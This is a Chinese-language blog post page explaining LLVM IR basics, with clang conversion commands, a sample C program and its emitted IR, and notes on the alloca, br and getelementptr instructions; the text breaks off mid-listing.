<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Pwn进你的心">
<meta property="og:url" content="http://example.com/page/9/index.html">
<meta property="og:site_name" content="Pwn进你的心">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="yhellow">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/9/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Pwn进你的心</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Pwn进你的心</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/24/LLVM%20%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/03/24/LLVM%20%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="post-title-link" itemprop="url">LLVM 基础知识</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-03-24 20:12:28" itemprop="dateCreated datePublished" datetime="2023-03-24T20:12:28+08:00">2023-03-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-31 12:38:05" itemprop="dateModified" datetime="2023-03-31T12:38:05+08:00">2023-03-31</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>15k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>14 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="LLVM-IR"><a href="#LLVM-IR" class="headerlink" title="LLVM IR"></a>LLVM IR</h2><p>LLVM 项目是模块化、可重用的编译器以及工具链技术的集合，用于优化以任意程序语言编写的程序的编译时间 (compile-time)，链接时间 (link-time)，运行时间 (run-time)，以及空闲时间 (idle-time) </p>
<p>编译可以分为五个基本步骤：</p>
<ul>
<li>词法分析</li>
<li>语法分析</li>
<li>语义分析</li>
<li>中间代码的生成、优化</li>
<li>目标代码的生成</li>
</ul>
<p>这是每个编译器都必须的基本步骤和流程，从源头输入高级语言源程序输出目标语言代码</p>
<p>IR主要有以下四部分组成：</p>
<ul>
<li>Module：模块</li>
<li>Function：函数</li>
<li>BasicBlock：基本块（对应复合语句，用 <code>&#123;&#125;</code> 包裹起来）</li>
<li>Instruction：指令</li>
</ul>
<p><strong>基础流程</strong></p>
<p>具体流程如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">源代码 ==&gt;[词法分析]==&gt; 词法单元流(token) ==&gt;[语法分析]==&gt; 语法树(AST) ==&gt;[语义分析]==&gt; 语法树(AST) ==&gt;[中间代码的生成,优化]==&gt; 中间代码 ==&gt;[目标代码的生成]==&gt; 目标机器代码</span><br></pre></td></tr></table></figure>
<p>LLVM 则使用 LLVM IR 为中间代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">源代码 ==&gt;[词法分析]==&gt; 词法单元流(token) ==&gt;[语法/语义分析]==&gt; 语法树(AST) ==&gt;[中间代码的生成]==&gt; LLVM IR ==&gt;[中间代码的优化]==&gt; 生成汇编代码 ==&gt;[汇编+链接]==&gt; 目标机器代码</span><br></pre></td></tr></table></figure>
<p>传给 LLVM PASS 进行优化的数据是 LLVM IR，即代码的中间表示，LLVM IR有三种表示形式 ：这三种中间格式是完全等价的：</p>
<ul>
<li>在内存中的编译中间语言（我们无法通过文件的形式得到）</li>
<li>在硬盘上存储的二进制中间语言（格式为 <code>.bc</code>）</li>
<li>人类可读的代码语言（格式为 <code>.ll</code>）</li>
</ul>
<p>从对应格式转化到另一格式的命令如下： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.c -&gt; .ll：clang -emit-llvm -S a.c -o a.ll</span><br><span class="line">.c -&gt; .bc: clang -emit-llvm -c a.c -o a.bc</span><br><span class="line">.ll -&gt; .bc: llvm-as a.ll -o a.bc</span><br><span class="line">.bc -&gt; .ll: llvm-dis a.bc -o a.ll</span><br><span class="line">.bc -&gt; .s: llc a.bc -o a.s</span><br></pre></td></tr></table></figure>
<p>LLVM 使用案例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun1</span><span class="params">(<span class="keyword">int</span> *a,<span class="keyword">int</span> *b)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> c;</span><br><span class="line">	<span class="keyword">if</span>(a&gt;b)&#123;</span><br><span class="line">		c=*a;</span><br><span class="line">		*a=*b;</span><br><span class="line">		*b=c;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>,*a,*b);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun2</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(i&lt;n)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,i);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> name[<span class="number">0x10</span>];</span><br><span class="line">	read(<span class="number">0</span>,&amp;name[<span class="number">0</span>],<span class="number">0x10</span>);</span><br><span class="line">	write(<span class="number">1</span>,&amp;name[<span class="number">1</span>],<span class="number">0x10</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;bye\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -emit-llvm -S test.c -o test.ll</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">; ModuleID = <span class="string">&#x27;test.c&#x27;</span></span><br><span class="line">source_filename = <span class="string">&quot;test.c&quot;</span></span><br><span class="line">target datalayout = <span class="string">&quot;e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&quot;</span></span><br><span class="line">target triple = <span class="string">&quot;x86_64-pc-linux-gnu&quot;</span></span><br><span class="line"></span><br><span class="line">@.str = <span class="keyword">private</span> unnamed_addr constant [<span class="number">7</span> x i8] c<span class="string">&quot;%d %d\0A\00&quot;</span>, align <span class="number">1</span></span><br><span class="line">@.str<span class="number">.1</span> = <span class="keyword">private</span> unnamed_addr constant [<span class="number">4</span> x i8] c<span class="string">&quot;%d\0A\00&quot;</span>, align <span class="number">1</span></span><br><span class="line">@.str<span class="number">.2</span> = <span class="keyword">private</span> unnamed_addr constant [<span class="number">5</span> x i8] c<span class="string">&quot;bye\0A\00&quot;</span>, align <span class="number">1</span></span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local <span class="keyword">void</span> @fun1(i32* %<span class="number">0</span>, i32* %<span class="number">1</span>) #<span class="number">0</span> &#123; <span class="comment">/* Function */</span></span><br><span class="line">  %<span class="number">3</span> = alloca i32*, align <span class="number">8</span> <span class="comment">/* Instruction */</span></span><br><span class="line">  %<span class="number">4</span> = alloca i32*, align <span class="number">8</span></span><br><span class="line">  %<span class="number">5</span> = alloca i32, align <span class="number">4</span></span><br><span class="line">  store i32* %<span class="number">0</span>, i32** %<span class="number">3</span>, align <span class="number">8</span></span><br><span class="line">  store i32* %<span class="number">1</span>, i32** %<span class="number">4</span>, align <span class="number">8</span></span><br><span class="line">  %<span class="number">6</span> = load i32*, i32** %<span class="number">3</span>, align <span class="number">8</span></span><br><span class="line">  %<span class="number">7</span> = load i32*, i32** %<span class="number">4</span>, align <span class="number">8</span></span><br><span class="line">  %<span class="number">8</span> = icmp ugt i32* %<span class="number">6</span>, %<span class="number">7</span></span><br><span class="line">  br i1 %<span class="number">8</span>, label %<span class="number">9</span>, label %<span class="number">17</span></span><br><span class="line"></span><br><span class="line"><span class="number">9</span>:                                                ; preds = %<span class="number">2</span> <span class="comment">/* BasicBlock */</span></span><br><span class="line">  %<span class="number">10</span> = load i32*, i32** %<span class="number">3</span>, align <span class="number">8</span></span><br><span class="line">  %<span class="number">11</span> = load i32, i32* %<span class="number">10</span>, align <span class="number">4</span></span><br><span class="line">  store i32 %<span class="number">11</span>, i32* %<span class="number">5</span>, align <span class="number">4</span></span><br><span class="line">  %<span class="number">12</span> = load i32*, i32** %<span class="number">4</span>, align <span class="number">8</span></span><br><span class="line">  %<span class="number">13</span> = load i32, i32* %<span class="number">12</span>, align <span class="number">4</span></span><br><span class="line">  %<span class="number">14</span> = load i32*, i32** %<span class="number">3</span>, align <span class="number">8</span></span><br><span class="line">  store i32 %<span class="number">13</span>, i32* %<span class="number">14</span>, align <span class="number">4</span></span><br><span class="line">  %<span class="number">15</span> = load i32, i32* %<span class="number">5</span>, align <span class="number">4</span></span><br><span class="line">  %<span class="number">16</span> = load i32*, i32** %<span class="number">4</span>, align <span class="number">8</span></span><br><span class="line">  store i32 %<span class="number">15</span>, i32* %<span class="number">16</span>, align <span class="number">4</span></span><br><span class="line">  br label %<span class="number">23</span></span><br><span class="line"></span><br><span class="line"><span class="number">17</span>:                                               ; preds = %<span class="number">2</span></span><br><span class="line">  %<span class="number">18</span> = load i32*, i32** %<span class="number">3</span>, align <span class="number">8</span></span><br><span class="line">  %<span class="number">19</span> = load i32, i32* %<span class="number">18</span>, align <span class="number">4</span></span><br><span class="line">  %<span class="number">20</span> = load i32*, i32** %<span class="number">4</span>, align <span class="number">8</span></span><br><span class="line">  %<span class="number">21</span> = load i32, i32* %<span class="number">20</span>, align <span class="number">4</span></span><br><span class="line">  %<span class="number">22</span> = call i32 (i8*, ...) @<span class="built_in">printf</span>(i8* getelementptr inbounds ([<span class="number">7</span> x i8], [<span class="number">7</span> x i8]* @.str, i64 <span class="number">0</span>, i64 <span class="number">0</span>), i32 %<span class="number">19</span>, i32 %<span class="number">21</span>)</span><br><span class="line">  br label %<span class="number">23</span></span><br><span class="line"></span><br><span class="line"><span class="number">23</span>:                                               ; preds = %<span class="number">17</span>, %<span class="number">9</span></span><br><span class="line">  ret <span class="keyword">void</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">declare dso_local i32 @<span class="built_in">printf</span>(i8*, ...) #<span class="number">1</span></span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local <span class="keyword">void</span> @fun2(i32 %<span class="number">0</span>) #<span class="number">0</span> &#123;</span><br><span class="line">  %<span class="number">2</span> = alloca i32, align <span class="number">4</span></span><br><span class="line">  %<span class="number">3</span> = alloca i32, align <span class="number">4</span></span><br><span class="line">  store i32 %<span class="number">0</span>, i32* %<span class="number">2</span>, align <span class="number">4</span></span><br><span class="line">  store i32 <span class="number">0</span>, i32* %<span class="number">3</span>, align <span class="number">4</span></span><br><span class="line">  br label %<span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="number">4</span>:                                                ; preds = %<span class="number">8</span>, %<span class="number">1</span></span><br><span class="line">  %<span class="number">5</span> = load i32, i32* %<span class="number">3</span>, align <span class="number">4</span></span><br><span class="line">  %<span class="number">6</span> = load i32, i32* %<span class="number">2</span>, align <span class="number">4</span></span><br><span class="line">  %<span class="number">7</span> = icmp slt i32 %<span class="number">5</span>, %<span class="number">6</span></span><br><span class="line">  br i1 %<span class="number">7</span>, label %<span class="number">8</span>, label %<span class="number">11</span></span><br><span class="line"></span><br><span class="line"><span class="number">8</span>:                                                ; preds = %<span class="number">4</span></span><br><span class="line">  %<span class="number">9</span> = load i32, i32* %<span class="number">3</span>, align <span class="number">4</span></span><br><span class="line">  %<span class="number">10</span> = call i32 (i8*, ...) @<span class="built_in">printf</span>(i8* getelementptr inbounds ([<span class="number">4</span> x i8], [<span class="number">4</span> x i8]* @.str<span class="number">.1</span>, i64 <span class="number">0</span>, i64 <span class="number">0</span>), i32 %<span class="number">9</span>)</span><br><span class="line">  br label %<span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="number">11</span>:                                               ; preds = %<span class="number">4</span></span><br><span class="line">  ret <span class="keyword">void</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local i32 @main() #<span class="number">0</span> &#123;</span><br><span class="line">  %<span class="number">1</span> = alloca i32, align <span class="number">4</span></span><br><span class="line">  %<span class="number">2</span> = alloca [<span class="number">16</span> x i8], align <span class="number">16</span></span><br><span class="line">  store i32 <span class="number">0</span>, i32* %<span class="number">1</span>, align <span class="number">4</span></span><br><span class="line">  %<span class="number">3</span> = getelementptr inbounds [<span class="number">16</span> x i8], [<span class="number">16</span> x i8]* %<span class="number">2</span>, i64 <span class="number">0</span>, i64 <span class="number">0</span></span><br><span class="line">  %<span class="number">4</span> = call i64 @read(i32 <span class="number">0</span>, i8* %<span class="number">3</span>, i64 <span class="number">16</span>)</span><br><span class="line">  %<span class="number">5</span> = getelementptr inbounds [<span class="number">16</span> x i8], [<span class="number">16</span> x i8]* %<span class="number">2</span>, i64 <span class="number">0</span>, i64 <span class="number">1</span></span><br><span class="line">  %<span class="number">6</span> = call i64 @write(i32 <span class="number">1</span>, i8* %<span class="number">5</span>, i64 <span class="number">16</span>)</span><br><span class="line">  %<span class="number">7</span> = call i32 (i8*, ...) @<span class="built_in">printf</span>(i8* getelementptr inbounds ([<span class="number">5</span> x i8], [<span class="number">5</span> x i8]* @.str<span class="number">.2</span>, i64 <span class="number">0</span>, i64 <span class="number">0</span>))</span><br><span class="line">  ret i32 <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">declare dso_local i64 @read(i32, i8*, i64) #<span class="number">1</span></span><br><span class="line"></span><br><span class="line">declare dso_local i64 @write(i32, i8*, i64) #<span class="number">1</span></span><br><span class="line"></span><br><span class="line">attributes #<span class="number">0</span> = &#123; noinline nounwind optnone uwtable <span class="string">&quot;correctly-rounded-divide-sqrt-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;disable-tail-calls&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;frame-pointer&quot;</span>=<span class="string">&quot;all&quot;</span> <span class="string">&quot;less-precise-fpmad&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;min-legal-vector-width&quot;</span>=<span class="string">&quot;0&quot;</span> <span class="string">&quot;no-infs-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-jump-tables&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-nans-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-signed-zeros-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-trapping-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;stack-protector-buffer-size&quot;</span>=<span class="string">&quot;8&quot;</span> <span class="string">&quot;target-cpu&quot;</span>=<span class="string">&quot;x86-64&quot;</span> <span class="string">&quot;target-features&quot;</span>=<span class="string">&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot;</span> <span class="string">&quot;unsafe-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;use-soft-float&quot;</span>=<span class="string">&quot;false&quot;</span> &#125;</span><br><span class="line">attributes #<span class="number">1</span> = &#123; <span class="string">&quot;correctly-rounded-divide-sqrt-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;disable-tail-calls&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;frame-pointer&quot;</span>=<span class="string">&quot;all&quot;</span> <span class="string">&quot;less-precise-fpmad&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-infs-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-nans-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-signed-zeros-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-trapping-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;stack-protector-buffer-size&quot;</span>=<span class="string">&quot;8&quot;</span> <span class="string">&quot;target-cpu&quot;</span>=<span class="string">&quot;x86-64&quot;</span> <span class="string">&quot;target-features&quot;</span>=<span class="string">&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot;</span> <span class="string">&quot;unsafe-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;use-soft-float&quot;</span>=<span class="string">&quot;false&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line">!llvm.<span class="keyword">module</span>.flags = !&#123;!<span class="number">0</span>&#125;</span><br><span class="line">!llvm.ident = !&#123;!<span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line">!<span class="number">0</span> = !&#123;i32 <span class="number">1</span>, !<span class="string">&quot;wchar_size&quot;</span>, i32 <span class="number">4</span>&#125;</span><br><span class="line">!<span class="number">1</span> = !&#123;!<span class="string">&quot;clang version 10.0.0-4ubuntu1 &quot;</span>&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>@代表全局标识符（函数，全局变量）</li>
<li>%代表局部标识符（寄存器名称也就是局部变量，类型）</li>
<li>alloca 指令：用于分配内存堆栈给当前执行的函数，当这个函数返回其调用者时自动释放</li>
<li>br 指令：第一个参数是 <code>i1</code> 类型的值，用于作判断，第二和第三个参数分别是值为 <code>true</code> 和 <code>false</code> 时需要跳转到的标签 </li>
</ul>
<p><strong>指令分析</strong></p>
<p>GetElementPtr 指令是一条指针计算语句，本身并不进行任何数据的访问或修改，只进行指针的计算</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;result&gt; = getelementptr &lt;ty&gt;, &lt;ty&gt;* &lt;ptrval&gt;&#123;, [inrange] &lt;ty&gt; &lt;idx&gt;&#125;*</span><br><span class="line">&lt;result&gt; = getelementptr inbounds &lt;ty&gt;, &lt;ty&gt;* &lt;ptrval&gt;&#123;, [inrange] &lt;ty&gt; &lt;idx&gt;&#125;*</span><br><span class="line">&lt;result&gt; = getelementptr &lt;ty&gt;, &lt;ptr <span class="built_in">vector</span>&gt; &lt;ptrval&gt;, [inrange] &lt;<span class="built_in">vector</span> index type&gt; &lt;idx&gt; </span><br></pre></td></tr></table></figure>
<ul>
<li>第一个 <code>&lt;ty&gt;</code> 是 “第一个索引” 使用的基本类型</li>
<li>第二个 <code>&lt;ty&gt;*</code> 表示其后的基地址 <code>&lt;ptrval&gt;</code> 的类型</li>
</ul>
<p>案例：数组处理</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">char</span> name1[<span class="number">0x10</span>];</span><br><span class="line">   <span class="keyword">char</span> name2[<span class="number">0x10</span>][<span class="number">0x10</span>];</span><br><span class="line">   <span class="keyword">char</span>* name3[<span class="number">0x10</span>];</span><br><span class="line">   name1[<span class="number">0x8</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">   name2[<span class="number">0x4</span>][<span class="number">0x4</span>] = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">   name1[<span class="number">0</span>]=name1[<span class="number">4</span>];</span><br><span class="line">   name3[<span class="number">0</span>]=&amp;name1[<span class="number">5</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">1</span> = alloca [<span class="number">16</span> x i8], align <span class="number">16</span> <span class="comment">/* 创建变量 */</span></span><br><span class="line">%<span class="number">2</span> = alloca [<span class="number">16</span> x [<span class="number">16</span> x i8]], align <span class="number">16</span></span><br><span class="line">%<span class="number">3</span> = alloca [<span class="number">16</span> x i8*], align <span class="number">16</span></span><br><span class="line">%<span class="number">4</span> = getelementptr inbounds [<span class="number">16</span> x i8], [<span class="number">16</span> x i8]* %<span class="number">1</span>, i64 <span class="number">0</span>, i64 <span class="number">8</span></span><br><span class="line">store i8 <span class="number">97</span>, i8* %<span class="number">4</span>, align <span class="number">8</span></span><br><span class="line">%<span class="number">5</span> = getelementptr inbounds [<span class="number">16</span> x [<span class="number">16</span> x i8]], [<span class="number">16</span> x [<span class="number">16</span> x i8]]* 